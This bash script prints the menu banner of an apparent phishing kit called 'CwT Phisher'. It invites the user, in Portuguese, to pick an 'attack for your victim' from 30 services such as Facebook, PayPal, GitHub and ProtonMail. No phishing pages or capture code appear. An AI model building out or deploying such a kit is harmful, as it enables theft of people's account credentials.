#!/bin/bash
banner=(
"\ec\e[1;35m   ____          _____ \e[1;31m  ____  _     _     _"
"\e[1;35m  / ___|_      _|_   _|\e[1;31m |  _ \| |__ (_)___| |__   ___ _ __"
"\e[1;35m | |   \ \ /\ / / | |  \e[1;31m | |_) | '_ \| / __| '_ \ / _ \ '__|"
"\e[1;35m | |___ \ V  V /  | |  \e[1;31m |  __/| | | | \__ \ | | |  __/ |"
 "\e[1;35m  \____| \_/\_/   |_|  \e[1;31m |_|   |_| |_|_|___/_| |_|\___|_|\e[3;37;44m[ v 0.0.1 ]\e[m"
" "
"\e[1;32m      (+_+)\e[1;33m Selecione qualquer ataque para sua vítima \e[1;32m(+_+)"
" "
" [\e[1;36m01\e[1;32m]\e[1;36m Facebook     \e[1;32m[\e[1;36m11\e[1;32m]\e[1;36m Twitch       \e[1;32m[\e[1;36m21\e[1;32m] \e[1;36mDeviantArt" 
"\e[1;32m [\e[1;36m02\e[1;32m]\e[1;36m Instagram    \e[1;32m[\e[1;36m12\e[1;32m]\e[1;36m Pinterest    \e[1;32m[\e[1;36m22\e[1;32m] \e[1;36mBadoo"     
"\e[1;32m [\e[1;36m03\e[1;32m]\e[1;36m Google       \e[1;32m[\e[1;36m13\e[1;32m]\e[1;36m Snapchat     \e[1;32m[\e[1;36m23\e[1;32m] \e[1;36mOrigin"
"\e[1;32m [\e[1;36m04\e[1;32m]\e[1;36m Microsoft    \e[1;32m[\e[1;36m14\e[1;32m]\e[1;36m Linkedin     \e[1;32m[\e[1;36m24\e[1;32m] \e[1;36mCryptoCoin"
"\e[1;32m [\e[1;36m05\e[1;32m]\e[1;36m Netflix      \e[1;32m[\e[1;36m15\e[1;32m]\e[1;36m Ebay         \e[1;32m[\e[1;36m25\e[1;32m] \e[1;36mYahoo"
"\e[1;32m [\e[1;36m06\e[1;32m]\e[1;36m Paypal       \e[1;32m[\e[1;36m16\e[1;32m]\e[1;36m Dropbox      \e[1;32m[\e[1;36m26\e[1;32m] \e[1;36mWordpress"
"\e[1;32m [\e[1;36m07\e[1;32m]\e[1;36m Steam        \e[1;32m[\e[1;36m17\e[1;32m]\e[1;36m Protonmail   \e[1;32m[\e[1;36m27\e[1;32m] \e[1;36mYandex"
"\e[1;32m [\e[1;36m08\e[1;32m]\e[1;36m Twitter      \e[1;32m[\e[1;36m18\e[1;32m]\e[1;36m Spotify      \e[1;32m[\e[1;36m28\e[1;32m] \e[1;36mStackoverFlow"
"\e[1;32m [\e[1;36m09\e[1;32m]\e[1;36m Playstation  \e[1;32m[\e[1;36m19\e[1;32m]\e[1;36m Reddit       \e[1;32m[\e[1;36m29\e[1;32m] \e[1;36mVk"
"\e[1;32m [\e[1;36m10\e[1;32m]\e[1;36m Github       \e[1;32m[\e[1;36m20\e[1;32m]\e[1;36m Adobe        \e[1;32m[\e[1;36m30\e[1;32m] \e[1;36mXBOX"
" " 
"\e[1;32m [\e[1;31m98\e[1;32m]\e[1;36m Sobre o script"
"\e[1;32m [\e[1;31m99\e[1;32m]\e[1;36m Sair do script"
" ")
for i in "${banner[@]}"; do
  printf "${i}\n" && sleep 0.001
done
read -p $'\e[1;32m [\e[1;31m+\e[1;32m]\e[1;32m Selecione a opção:\e[1;36m '
